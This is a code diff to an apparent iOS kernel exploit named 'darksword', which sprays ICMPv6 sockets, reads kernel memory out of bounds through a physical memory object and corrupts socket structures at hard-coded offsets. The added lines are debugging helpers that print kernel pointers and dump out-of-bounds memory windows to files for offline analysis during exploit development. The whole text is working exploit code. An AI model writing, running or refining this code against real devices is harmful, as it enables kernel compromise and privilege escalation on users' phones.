@@ -288,6 +288,31 @@ bool scan_freed_pages(void *buf, mach_vm_size_t size) {
     return false;
 }
 
+// DIAGNOSTIC: write raw OOB windows to Documents/dump_<tag>_<n>.bin so they
+// can be pulled off-device via AFC and inspected offline. This tells us what
+// the OOB window actually contains (kernel inpcb vs our own process pages).
+static uint64_t gDumpCount = 0;
+static void dump_window(const void *buf, mach_vm_size_t size, const char *tag) {
+    if (gDumpCount >= 64) return;
+    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *path = [dir stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"dump_%s_%llu.bin", tag, gDumpCount]];
+    FILE *f = fopen(path.fileSystemRepresentation, "wb");
+    if (f) { fwrite(buf, 1, size, f); fclose(f); }
+    gDumpCount++;
+}
+
+// DIAGNOSTIC: decode the first words of a window as pointers/ASCII so the
+// on-device log shows us what kind of memory we are reading.
+static void describe_window(const void *buf, mach_vm_size_t size, const char *tag) {
+    printf("[dbg] %s window @ %p size=0x%llx\n", tag, buf, (unsigned long long)size);
+    const uint64_t *w = (const uint64_t *)buf;
+    for (int i = 0; i < 8 && (mach_vm_size_t)(i * 8) < size; i++) {
+        printf("[dbg]   +0x%03x: 0x%016llx\n", i * 8, (unsigned long long)w[i]);
+    }
+    fflush(stdout);
+}
+
 fileport_t spray_socket(void) {
     pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
@@ -489,17 +514,21 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
         if (hit) {
             gNameHits++;
             pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00ULL;
-            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) {
+            uint64_t f8 = *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8);
+            if ((gNameHits & 0xF) == 1) {
+                printf("[dbg] hit pso=0x%llx icmp6filt8=0x%llx tg(+0x78)=0x%llx next(+0x28)=0x%llx\n",
+                    pso, f8,
+                    *(uint64_t*)((uintptr_t)rBuf + pso + 0x78),
+                    *(uint64_t*)((uintptr_t)rBuf + pso + 0x28));
+                fflush(stdout);
+            }
+            if (f8) {
                 found = true;
+                describe_window(rBuf, OOB_SIZE, "cand");
+                dump_window(rBuf, OOB_SIZE, "cand");
                 break;
             }
             gRejZero++;
-            if ((gNameHits & 0x1FF) == 0) {
-                printf("[dbg] nameHits=%llu rejZero=%llu pso=0x%llx icmp6filt+8=0x%llx\n",
-                    gNameHits, gRejZero, pso,
-                    *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8));
-                fflush(stdout);
-            }
         }
         si += 0x400;
     } while (hit == NULL && si < OOB_SIZE);
@@ -1478,6 +1507,17 @@ bool run_darksword(void) {
             (unsigned long)[socketPorts count],
             [(NSNumber*)[socketPcbIds firstObject] unsignedLongLongValue],
             [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);
+        {
+            NSUInteger cnt = [(NSMutableArray*)socketPcbIds count];
+            NSUInteger samp = cnt < 12 ? cnt : 12;
+            printf("[dbg] gencnt samples: ");
+            for (NSUInteger i = 0; i < samp; i++)
+                printf("0x%llx ", [(NSNumber*)socketPcbIds[i] unsignedLongLongValue]);
+            if (cnt > samp) printf("... last 0x%llx",
+                [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);
+            printf("\n");
+            fflush(stdout);
+        }
 
         bool ok = false;
         for (uint64_t s = 0; s < mappingNum; s++) {
@@ -1493,6 +1533,10 @@ bool run_darksword(void) {
             uint64_t mStart = mach_absolute_time();
             for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
+                    if ((successReadCount <= 8) && (gDumpCount < 64)) {
+                        describe_window(rBuf, OOB_SIZE, "first-ok");
+                        dump_window(rBuf, OOB_SIZE, "win");
+                    }
                     if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
                         ok = true;
                         break;
